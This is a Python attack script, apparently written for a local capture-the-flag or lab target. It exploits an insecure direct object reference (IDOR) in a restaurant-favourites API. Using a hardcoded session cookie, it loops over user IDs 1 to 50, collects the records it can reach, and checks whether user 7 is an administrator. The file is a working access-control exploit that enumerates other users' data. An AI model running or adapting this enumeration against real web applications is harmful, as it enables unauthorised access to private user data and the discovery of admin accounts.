import requests
import json
import sys

# Target endpoint
base_url = "http://127.0.0.1:32825"
endpoint = "/api/get_favorite_restaurants.php"

# Session with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", "hk4mi61pda6ge5d66s5qjhkil3")

# Store results
valid_users = []
user_7_data = None

print("[*] Starting IDOR enumeration on /api/get_favorite_restaurants.php")
print("[*] Testing user IDs 1-50\n")

# Test user IDs 1-50
for user_id in range(1, 51):
    try:
        url = f"{base_url}{endpoint}?userId={user_id}"
        response = session.get(url, timeout=10)
        
        # Check if response is valid JSON and not an error
        try:
            data = response.json()
            # Check for error indicators in JSON response
            error_indicators = ['error', 'Error', 'ERROR', 'fail', 'Fail', 'FAIL', 'invalid', 'Invalid']
            has_error = any(indicator in str(data) for indicator in error_indicators)
            
            if response.status_code == 200 and not has_error:
                print(f"[+] userId={user_id}: VALID - Status: {response.status_code}")
                valid_users.append(user_id)
                
                # For userId=7, extract admin info
                if user_id == 7:
                    user_7_data = data
                    print(f"  [INFO] userId=7 data: {json.dumps(data, indent=2)}")
                else:
                    print(f"  [INFO] Response preview: {str(data)[:80]}...")
            else:
                print(f"[-] userId={user_id}: Invalid - Status: {response.status_code}")
                if has_error:
                    print(f"  [ERROR] Error in response")
                    
        except json.JSONDecodeError:
            print(f"[-] userId={user_id}: Not JSON - Status: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] userId={user_id}: Request failed - {str(e)}")
        continue

# Summary
print("\n" + "="*60)
print("ENUMERATION SUMMARY")
print("="*60)
print(f"[*] Valid user IDs found: {len(valid_users)}")
print(f"[*] Valid IDs: {valid_users}")

if user_7_data:
    print("\n[+] CONFIRMED: userId=7 is valid")
    if 'username' in str(user_7_data).lower() and 'admin' in str(user_7_data).lower():
        print("[+] ADMIN INDICATOR: username contains 'admin'")
        print("[+] userId=7 appears to be an ADMIN user")
    else:
        print("[*] Full userId=7 data:")
        print(json.dumps(user_7_data, indent=2))

print("\n[*] IDOR enumeration completed")
